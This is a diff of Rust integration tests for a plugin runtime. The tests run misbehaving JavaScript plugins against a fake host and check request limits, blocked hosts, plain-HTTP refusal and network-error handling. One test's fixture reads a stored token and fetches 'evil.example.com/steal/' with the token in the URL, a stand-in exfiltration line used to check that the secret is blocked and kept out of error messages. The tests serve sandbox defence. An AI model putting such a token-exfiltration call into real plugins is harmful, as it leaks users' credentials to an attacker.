@@ -1,7 +1,9 @@
 //! Plugins that misbehave, run on the real runtime. Each must end as the
 //! documented status, keep the console line it wrote before misbehaving, and
 //! leave the pool able to run the next job. The scripts are those of the old
-//! app's hostile fixtures. (The cases that need `fetch` come with its natives.)
+//! app's hostile fixtures. The fetch cases use a scripted host that plays the
+//! app's answers; whether a host or a scheme is allowed is the app's call, so
+//! the host returns that outcome and the runtime must map it.
 
 // Helpers outside `#[test]` functions may unwrap too.
 #![allow(clippy::unwrap_used)]
@@ -10,8 +12,12 @@ mod common;
 
 use std::time::{Duration, Instant};
 
-use common::{file, run_files, run_script};
-use kanaru_plugin_runtime::{limits, ScriptResult, ScriptStatus as S};
+use common::{
+    file, ok_response, outcome_response, run_files, run_script, run_with_host, FakeHost, RunOptions,
+};
+use kanaru_plugin_runtime::{
+    limits, FetchFailureKind, FetchOutcome, ScriptResult, ScriptStatus as S,
+};
 
 fn assert_pool_still_works() {
     let r = run_script("function execute() { return Response.success('fine'); }", 0);
@@ -172,4 +178,106 @@ fn load_outside_the_package_is_a_script_error() {
     assert!(r.error_message.contains("load"), "{}", r.error_message);
     assert!(r.js_error.is_some());
     assert_eq!(r.logs, vec!["before the load"]);
+}
+
+#[test]
+fn eleven_fetches_stop_at_ten() {
+    let _t = common::test();
+    let host = FakeHost::answering(|_| ok_response(200, b"[]"));
+    let r = run_with_host(
+        r#"function execute(input) {
+             for (var i = 0; i < 11; i++) {
+               console.log("fetch " + i);
+               fetch("https://lrclib.net/api/search", { queries: { q: "n" + i } });
+             }
+             return Response.success([]);
+           }"#,
+        host.clone(),
+        RunOptions::default(),
+    );
+    assert_eq!(r.status, S::ScriptError, "{r:?}");
+    let want: Vec<String> = (0..11).map(|i| format!("fetch {i}")).collect();
+    assert_eq!(r.logs, want);
+    assert_eq!(host.requests().len(), 10, "the eleventh never crossed");
+    let failure = r.fetch_failure.expect("failure kept");
+    assert_eq!(failure.kind, FetchFailureKind::InvalidRequest);
+    assert!(r.js_error.unwrap().message.contains("too many requests"));
+    assert_pool_still_works();
+}
+
+#[test]
+fn a_host_the_app_blocks_is_a_blocked_host_error_and_the_secret_stays_out() {
+    let _t = common::test();
+    const SECRET: &str = "sekret-value-123";
+    let host = FakeHost::answering(|_| outcome_response(FetchOutcome::BlockedHost));
+    let r = run_with_host(
+        r#"function execute(input) {
+             var token = localConfig.getItem("token");
+             console.log("before the fetch, token " + token);
+             fetch("https://evil.example.com/steal/" + token, { queries: { q: "t" } });
+             return Response.success([]);
+           }"#,
+        host.clone(),
+        RunOptions {
+            config: vec![("token".to_owned(), format!("\"{SECRET}\""))],
+            ..RunOptions::default()
+        },
+    );
+    assert_eq!(r.status, S::ScriptError, "{r:?}");
+    let failure = r.fetch_failure.clone().expect("failure kept");
+    assert_eq!(failure.kind, FetchFailureKind::BlockedHost);
+    assert!(!failure.message.contains(SECRET));
+    let js = r.js_error.as_ref().expect("the thrown error");
+    assert!(js.message.contains("not allowed"), "{js:?}");
+    assert!(!js.message.contains(SECRET) && !js.stack.contains(SECRET));
+    // The URL reaches the app untouched: judging it is the app's job.
+    let seen = host.requests();
+    assert_eq!(seen.len(), 1);
+    assert_eq!(
+        seen[0].url,
+        format!("https://evil.example.com/steal/{SECRET}?q=t")
+    );
+    assert_pool_still_works();
+}
+
+#[test]
+fn plain_http_is_passed_on_and_the_apps_refusal_is_the_error() {
+    let _t = common::test();
+    let host = FakeHost::answering(|_| outcome_response(FetchOutcome::BlockedHost));
+    let r = run_with_host(
+        r#"function execute(input) {
+             console.log("before the fetch");
+             fetch("http://lrclib.net/api/search", { queries: { q: "t" } });
+             return Response.success([]);
+           }"#,
+        host.clone(),
+        RunOptions::default(),
+    );
+    assert_eq!(r.status, S::ScriptError, "{r:?}");
+    assert_eq!(r.logs, vec!["before the fetch"]);
+    assert_eq!(r.fetch_failure.unwrap().kind, FetchFailureKind::BlockedHost);
+    assert!(host.requests()[0].url.starts_with("http://lrclib.net/"));
+    assert_pool_still_works();
+}
+
+#[test]
+fn a_swallowed_network_error_still_leaves_the_failure() {
+    let _t = common::test();
+    let host = FakeHost::answering(|_| outcome_response(FetchOutcome::Network));
+    let r = run_with_host(
+        r#"function execute(input) {
+             try {
+               fetch("https://lrclib.net/down");
+             } catch (e) {
+               console.log("fetch failed: " + e.name);
+             }
+             return Response.success([]);
+           }"#,
+        host,
+        RunOptions::default(),
+    );
+    assert_eq!(r.status, S::Ok, "the script returned normally: {r:?}");
+    assert_eq!(r.output_json, "[]");
+    assert_eq!(r.logs, vec!["fetch failed: NetworkError"]);
+    assert_eq!(r.fetch_failure.unwrap().kind, FetchFailureKind::Network);
 }
